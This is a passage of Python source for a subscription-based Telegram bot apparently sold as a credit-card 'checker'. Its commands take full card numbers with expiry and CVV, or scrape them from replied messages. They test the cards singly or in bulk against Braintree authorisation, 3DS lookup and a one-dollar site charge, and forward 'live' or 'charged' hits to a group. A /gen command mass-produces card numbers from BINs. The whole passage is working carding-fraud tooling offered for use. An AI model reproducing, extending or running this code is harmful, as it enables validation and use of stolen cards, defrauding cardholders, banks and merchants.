    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        cc = None
        
        # Check if command is empty (either '/b3' or '.b3' without arguments)
        if (message.text.startswith('/b3') and len(message.text.split()) == 1) or \
           (message.text.startswith('.b3') and len(message.text.strip()) == 3):
            
            # Check if this is a reply to another message
            if message.reply_to_message:
                # Search for CC in replied message text
                replied_text = message.reply_to_message.text
                # Try to find CC in common formats
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    # Clean the CC (remove spaces and dashes)
                    cc = matches[0].replace(' ', '').replace('-', '')
                    # Check if we have full card details (number|mm|yyyy|cvv)
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            # Normal processing for commands with arguments
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /b3 CC|MM|YYYY|CVV or .b3 CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:  # starts with .
                cc = message.text[4:].strip()  # remove ".b3 "

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Braintree Premium Auth</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_b3_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /mb3 and .mb3
@bot.message_handler(commands=['mb3'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mb3'))
def handle_mb3(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_b3_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Braintree Auth'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


# Handle both /vbv and .vbv
@bot.message_handler(commands=['vbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.vbv'))
def handle_vbv(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands.")
        return

    try:
        # Extract card from either format
        cc = None
        
        # Check if command is empty (either '/vbv' or '.vbv' without arguments)
        if (message.text.startswith('/vbv') and len(message.text.split()) == 1) or \
           (message.text.startswith('.vbv') and len(message.text.strip()) == 4):
            
            # Check if this is a reply to another message
            if message.reply_to_message:
                # Search for CC in replied message text
                replied_text = message.reply_to_message.text
                # Try to find CC in common formats
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    # Clean the CC (remove spaces and dashes)
                    cc = matches[0].replace(' ', '').replace('-', '')
                    # Check if we have full card details (number|mm|yyyy|cvv)
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            # Normal processing for commands with arguments
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /vbv CC|MM|YYYY|CVV or .vbv CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:  # starts with .
                cc = message.text[5:].strip()  # remove ".vbv "

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>3DS Lookup</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_vbv_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                # Auto-send to hits group if approved
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - vbv] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mvbv and .mvbv
@bot.message_handler(commands=['mvbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mvbv'))
def handle_mvbv(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_VBV_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_vbv_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': '3DS Lookup'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['cc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.cc'))
def handle_cc(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    # Check usage permissions
    if message.chat.type == 'private' and user_id not in ADMIN_IDS and not is_user_subscribed(user_id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. Use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and chat_id not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot. Contact @WasDarkboy to get approved.")
        return

    # Checker status
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Flood control
    if not is_user_subscribed(user_id) and not check_flood_control(user_id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Daily credit check
    if not is_user_subscribed(user_id):
        if not check_user_credits(user_id, 1):
            remaining = get_remaining_credits(user_id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(user_id, 1)

    try:
        # Extract card from command or reply
        cc = None
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) > 1:
                cc = parts[1]
        else:
            content = message.text[4:].strip()
            if content:
                cc = content

        # If card not provided directly, try to extract from reply
        if not cc and message.reply_to_message:
            text_to_scan = message.reply_to_message.text or message.reply_to_message.caption or ""
            matches = re.findall(r'\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b', text_to_scan)
            if matches:
                cc = matches[0]

        if not cc:
            bot.reply_to(message, "❌ Invalid format. Use /cc CC|MM|YYYY|CVV or reply to a message with valid card format.")
            return

        start_time = time.time()
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        # Notify processing
        status_msg = bot.reply_to(
            message,
            f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Site Based [1$]</i>\n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>",
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_cc_cc(cc)
                result['user_id'] = user_id
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit with result
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Forward to hits group if success
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /cc] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mcc and .mcc
@bot.message_handler(commands=['mcc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mcc'))
def handle_mcc(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_cc_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Site Based [1$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle both /gen and .gen
@bot.message_handler(commands=['gen'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.gen'))
def handle_gen(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    try:
        # Parse command
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /gen BIN [COUNT] or .gen BIN [COUNT]")
            return
        
        bin_input = parts[1]
        if len(bin_input) < 6:
            bot.reply_to(message, "❌ Invalid BIN. BIN must be at least 6 digits.")
            return
        
        # Default behavior - show 10 CCs in message if no count specified
        if len(parts) == 2:
            # Get BIN info
            bin_info = get_bin_info(bin_input[:6])
            bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
            country_name = bin_info.get('country_name', 'N/A') if bin_info else 'N/A'
            flag = bin_info.get('country_flag', '🌍') if bin_info else '🌍'
            card_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
            
            status_msg = bot.reply_to(message, "🔄 Generating 10 CCs...")
            
            def generate_inline():
                try:
                    response = requests.get(CC_GENERATOR_URL.format(bin_input, 10))
                    if response.status_code == 200:
                        ccs = response.text.strip().split('\n')
                        formatted_ccs = "\n".join(f"<code>{cc}</code>" for cc in ccs)
                        
                        result = f"""
<pre>Generated 10 CCs 💳</pre>

{formatted_ccs}

<pre>BIN-LOOKUP
BIN ➳ {bin_input}
Country ➳ {country_name} {flag}
Type ➳ {card_type}
Bank ➳ {bank}</pre>
"""
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=result,
                                            parse_mode='HTML')
                    else:
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text="❌ Failed to generate CCs. Please try again.")
                except Exception as e:
                    bot.edit_message_text(chat_id=message.chat.id,
                                         message_id=status_msg.message_id,
                                         text=f"❌ Error generating CCs: {str(e)}")
            
            threading.Thread(target=generate_inline).start()
        
        # If count is specified, always generate a file
        else:
            try:
                count = int(parts[2])
                if count <= 0:
                    bot.reply_to(message, "❌ Count must be at least 1")
                    return
                elif count > 5000:
                    count = 5000
                    bot.reply_to(message, "⚠️ Maximum count is 5000. Generating 5000 CCs.")
                
                # Get BIN info
                bin_info = get_bin_info(bin_input[:6])
                bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
                country_name = bin_info.get('country_name', 'N/A') if bin_info else 'N/A'
                flag = bin_info.get('country_flag', '🌍') if bin_info else '🌍'
                card_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
                
                status_msg = bot.reply_to(message, f"🔄 Generating {count} CCs... This may take a moment.")
                
                def generate_file():
                    try:
                        # Generate in chunks to avoid memory issues
                        chunk_size = 100
                        chunks = count // chunk_size
                        remainder = count % chunk_size
                        
                        with open(f'ccgen_{bin_input}.txt', 'w') as f:
                            for _ in range(chunks):
                                response = requests.get(CC_GENERATOR_URL.format(bin_input, chunk_size))
                                if response.status_code == 200:
                                    f.write(response.text)
                                time.sleep(1)  # Be gentle with the API
                            
                            if remainder > 0:
                                response = requests.get(CC_GENERATOR_URL.format(bin_input, remainder))
                                if response.status_code == 200:
                                    f.write(response.text)
                        
                        # Send the file
                        with open(f'ccgen_{bin_input}.txt', 'rb') as f:
                            bot.send_document(message.chat.id, f, caption=f"""
Generated {count} CCs 💳
━━━━━━━━━━━━━━━━━━
BIN ➳ {bin_input}
Country ➳ {country_name} {flag}
Type ➳ {card_type}
Bank ➳ {bank}
━━━━━━━━━━━━━━━━━━
""")
                        
                        # Clean up
                        os.remove(f'ccgen_{bin_input}.txt')
                        bot.delete_message(message.chat.id, status_msg.message_id)
                    
                    except Exception as e:
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=f"❌ Error generating CCs: {str(e)}")
                
                threading.Thread(target=generate_file).start()
            
            except ValueError:
                bot.reply_to(message, "❌ Invalid count. Please provide a number.")
    
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['info'])
def handle_info(message):
    try:
        from datetime import datetime

        # Get user information
        user_id = message.from_user.id
        first_name = message.from_user.first_name
        last_name = message.from_user.last_name if message.from_user.last_name else ""
        username = f"@{message.from_user.username}" if message.from_user.username else "None"
        chat_id = message.chat.id

        # Get subscription info
        is_subscribed = is_user_subscribed(user_id)
        if is_subscribed:
            expiry_date = datetime.strptime(SUBSCRIBED_USERS[str(user_id)]['expiry'], "%Y-%m-%d")
            days_left = (expiry_date - datetime.now()).days
            plan = SUBSCRIBED_USERS[str(user_id)]['plan']
            plan_info = f"✅ Subscribed (Plan {plan}, {days_left} days left)"
            credits_display = "Unlimited"
        else:
            plan_info = "❌ Not subscribed"
            credits = get_remaining_credits(user_id)
            credits_display = f"{credits}/{DAILY_CREDITS}"

        # Get member since date (from message timestamp)
        member_since = datetime.fromtimestamp(message.date).strftime('%Y-%m-%d')

        # Format the response
        response = f"""
┏━━━━━━━⍟
┃ 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨
┗━━━━━━━━━━━⊛

✧ Name ➳ {first_name} {last_name}
✧ Username ➳ {username}
✧ User ID ➳ <code>{user_id}</code>
✧ Chat ID ➳ <code>{chat_id}</code>
✧ Member Since ➳ {member_since}

✧ Status ➳ {plan_info}
✧ Credits ➳ {credits_display}

✧ Bot By ➳ ⎯꯭𖣐᪵̽𐎓⏤‌‌𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ ꯭𖠌𝆺꯭𝅥᪳𝆭࿐ 𓆩⃟🦅
"""
        bot.reply_to(message, response, parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error getting user info: {str(e)}")

@bot.message_handler(commands=['ping'])
def handle_ping(message):
    try:
        # Measure ping
        start = time.time()
        sent = bot.send_chat_action(message.chat.id, 'typing')
        end = time.time()
        realping = round((end - start) * 1000)  # in ms

        # Uptime
        uptime_seconds = time.time() - BOT_START_TIME
        uptime_str = str(timedelta(seconds=int(uptime_seconds)))

        # System info
        cpu = psutil.cpu_percent()
        memory = psutil.virtual_memory().percent
        system = platform.system()
        arch = platform.machine()

        # Optional: total users from a stored file or DB
        total_users = len(SUBSCRIBED_USERS) if 'SUBSCRIBED_USERS' in globals() else "Unknown"

        response = f"""
✦ 𝑺𝒕𝒐𝒓𝒎 ✗ 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𖤐 is running...

✧ Ping ➳ <code>{realping} ms</code>
✧ Up Time ➳ <code>{uptime_str}</code>
✧ CPU Usage ➳ <code>{cpu}%</code>
✧ RAM Usage ➳ <code>{memory}%</code>
✧ System ➳ <code>{system} ({arch})</code>

✧ Bot By ➳ ⎯꯭𖣐᪵̽𐎓⏤‌‌𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ ꯭𖠌𝆺꯭𝅥᪳𝆭࿐ 𓆩⃟🦅
"""
        bot.reply_to(message, response, parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error getting bot status: {str(e)}")

# /help command with two buttons
@bot.message_handler(commands=['help'])
def handle_help(message):
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    support_button = types.InlineKeyboardButton("🛠 Support", url="https://t.me/deep336bot")
    admin_button = types.InlineKeyboardButton("👤 Admin", url="https://t.me/darkboy336")
    markup.add(support_button, admin_button)

    bot.reply_to(message, "👇 Below is the support available for this bot 👇", reply_markup=markup)

# /credits command to show current user's credits
@bot.message_handler(commands=['credits'])
def handle_credits(message):
    user_id = str(message.from_user.id)
    is_sub = is_user_subscribed(user_id)

    if is_sub:
        bot.reply_to(message, "🌟 You have: <b>Unlimited</b> credits (Subscribed User)", parse_mode='HTML')
    else:
        remaining = get_remaining_credits(user_id)
        bot.reply_to(message, f"🔢 You have: <b>{remaining}</b> credits left today.", parse_mode='HTML')

@bot.message_handler(commands=['myplan'])
def handle_myplan(message):
    user_id = str(message.from_user.id)
    if user_id in SUBSCRIBED_USERS:
        plan_data = SUBSCRIBED_USERS[user_id]
        plan_number = plan_data['plan']
        expiry = plan_data['expiry']

        # Map plan number to name
        plan_names = {
            1: "🟢 Basic Plan",
            2: "🔵 Standard Plan",
            3: "🟣 Premium Plan"
        }

        plan_name = plan_names.get(plan_number, "Unknown Plan")

        response = f"""
┏━━━━━━⍟
┃ Your Current Plan
┗━━━━━━━━━━━━━⊛

✧ Plan Type ➳ <b>{plan_name}</b>
✧ Expiry Date ➳ <code>{expiry}</code>

- Enjoy Unlimited CC Checks & Exclusive Features!
"""
    else:
        response = "❌ You are not subscribed to any plan.\nUse /buy to see available options."

    bot.reply_to(message, response, parse_mode='HTML')

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    try:
        # Fetch fresh data from Firebase
        user_credits = read_firebase("user_credits") or {}
        subscribed_users = read_firebase("subscribed_users") or {}

        total_users = len(set(user_credits.keys()) | set(subscribed_users.keys()))
        total_subscribed = len(subscribed_users)

        today_str = str(datetime.now().date())
        total_checks_today = sum(
            DAILY_CREDITS - data.get("credits", 0)
            for data in user_credits.values()
            if data.get("date") == today_str
        )

